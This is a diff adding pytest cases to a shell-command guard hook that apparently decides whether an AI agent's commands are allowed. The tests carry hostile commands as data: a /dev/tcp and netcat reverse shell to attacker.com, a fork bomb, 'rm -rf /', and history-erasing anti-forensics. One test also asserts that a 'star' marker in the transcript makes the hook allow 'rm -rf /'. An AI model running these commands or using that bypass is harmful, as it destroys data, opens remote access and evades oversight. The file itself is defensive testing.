@@ -3,7 +3,7 @@ import subprocess
 import sys
 from pathlib import Path
 
-from conftest import run_hook, HOOK_SCRIPT
+from conftest import run_hook, make_transcript_with_star, HOOK_SCRIPT
 
 
 def test_rm_rf_blocked():
@@ -64,3 +64,39 @@ def test_output_schema():
     assert "hookSpecificOutput" in output
     assert "permissionDecision" in output["hookSpecificOutput"]
     assert "hookEventName" in output["hookSpecificOutput"]
+
+
+def test_bypass_star_prefix_allows_dangerous_command():
+    transcript = make_transcript_with_star()
+    output = run_hook("rm -rf /", transcript_path=transcript)
+    assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+
+
+def test_no_bypass_without_star():
+    output = run_hook("rm -rf /", transcript_path="")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_reverse_shell_tcp_blocked():
+    output = run_hook("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_reverse_shell_nc_blocked():
+    output = run_hook("nc -e /bin/bash attacker.com 4444")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_fork_bomb_blocked():
+    output = run_hook(":(){:|:&};:")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_anti_forensics_history_blocked():
+    output = run_hook("history -c")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_anti_forensics_shred_blocked():
+    output = run_hook("shred -u ~/.bash_history")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
